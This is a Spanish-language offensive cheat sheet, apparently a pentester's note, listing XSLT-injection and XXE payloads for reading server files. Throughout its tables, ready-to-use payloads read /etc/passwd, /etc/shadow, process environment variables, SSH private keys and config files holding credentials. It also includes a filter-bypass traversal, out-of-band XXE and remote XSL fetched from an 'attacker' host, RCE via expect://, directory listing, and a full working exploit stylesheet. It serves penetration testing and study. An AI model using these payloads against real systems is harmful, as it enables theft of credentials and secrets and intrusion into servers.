---
aliases:
  - XSLT document function
  - XSLT File Read
  - XSLT LFI
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - vuln/lfi
  - technique/collection
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
  - '[[XML External Entity (XXE)]]'
---
# XSLT - Lectura de Archivos (document)

***

## Función document()

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Lectura XML local Linux | `<xsl:copy-of select="document('file:///etc/tomcat9/server.xml')"/>` | Solo si el archivo es XML válido. |
| Lectura XML local Windows | `<xsl:copy-of select="document('file:///C:/inetpub/wwwroot/web.config')"/>` | IIS connection strings. |
| Lectura raw 2.0+ | `<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>` | Saxon — cualquier texto, no solo XML. |
| Con encoding | `<xsl:value-of select="unparsed-text('file:///etc/shadow', 'UTF-8')"/>` | Force charset. |
| Por líneas (3.0) | `<xsl:for-each select="unparsed-text-lines('file:///etc/passwd')">...</xsl:for-each>` | Iterar línea a línea. |
| `/proc/self/environ` | `<xsl:value-of select="unparsed-text('file:///proc/self/environ')"/>` | Env vars del proceso (creds en deploys). |
| `/proc/self/cmdline` | `<xsl:value-of select="unparsed-text('file:///proc/self/cmdline')"/>` | CLI args (`-Dpassword=...`). |
| Existencia | `<xsl:value-of select="unparsed-text-available('file:///root/.ssh/id_rsa')"/>` | Boolean oracle sin contenido. |
| Path traversal | `<xsl:copy-of select="document('../../../../etc/passwd')"/>` | Relativo al stylesheet base. |
| URL-encoded traversal | `<xsl:copy-of select="document('..%2F..%2Fetc%2Fpasswd')"/>` | Bypass de filtros básicos. |
| Wrapper externo | `<xsl:copy-of select="document('http://attacker/wrap.xsl')"/>` | Atacante sirve XSL que lee archivos no-XML. |
^xslt-lfi-document

### Archivos de alto valor

| OS / Stack | Path | Contenido |
|---|---|---|
| Linux | `/etc/passwd` | Users + UIDs |
| Linux | `/proc/self/environ` | Env vars (creds en deploys) |
| Tomcat | `/etc/tomcat9/tomcat-users.xml` | Hashes admin |
| Spring | `application.properties` / `application.yml` | DB creds |
| WordPress | `/var/www/html/wp-config.php` | DB password |
| Windows | `C:/inetpub/wwwroot/web.config` | Connection strings |
| .NET | `appsettings.json` | Secrets |

___

## XXE dentro de XSLT

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| XXE clásico file | `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:template match="/"><out>&xxe;</out></xsl:template>` | Si el parser XML del XSLT no bloquea entidades externas. |
| XXE Windows | `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` | Probe legible Windows. |
| XXE param entity OOB | `<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;` | Stage 2 desde DTD remoto. |
| XXE php filter | `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">` | Lee fuente PHP base64. |
| XXE expect (RCE PHP) | `<!ENTITY xxe SYSTEM "expect://id">` | RCE si PHP expect:// está habilitado. |
| Stylesheet con DOCTYPE | `<?xml version="1.0"?><!DOCTYPE stylesheet [...]><xsl:stylesheet ...>` | DOCTYPE va antes de `xsl:stylesheet`. |
^xslt-lfi-xxe

### Stylesheet completo XXE-en-XSLT

```xml
<?xml version="1.0"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>&xxe;</output>
  </xsl:template>
</xsl:stylesheet>
```

Ver [[XML External Entity (XXE)]] para variantes de XXE específicas.

___

## Lectura de Directorios

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Listar dir Saxon 9+ | `<xsl:for-each select="collection('file:///etc/?select=*;recurse=no')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Iterador con filtro glob. |
| Listar recursivo | `<xsl:for-each select="collection('file:///var/www/?select=*;recurse=yes')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Recurse=yes. |
| Filtro por extensión | `<xsl:for-each select="collection('file:///etc/?select=*.xml')">...</xsl:for-each>` | Glob *.xml / *.conf / *.bak. |
| Metadata | `<xsl:for-each select="collection('file:///etc/?select=*;metadata=yes')">...</xsl:for-each>` | Tamaño, modificado, etc. |
| Pasar dir como file | `<xsl:copy-of select="document('file:///etc/')"/>` | Algunos motores devuelven listing al pasar dir. |
| libxslt dir leak | `<xsl:value-of select="document('file:///proc/self/fd/')"/>` | Open file descriptors del proceso. |
^xslt-lfi-dirs

***
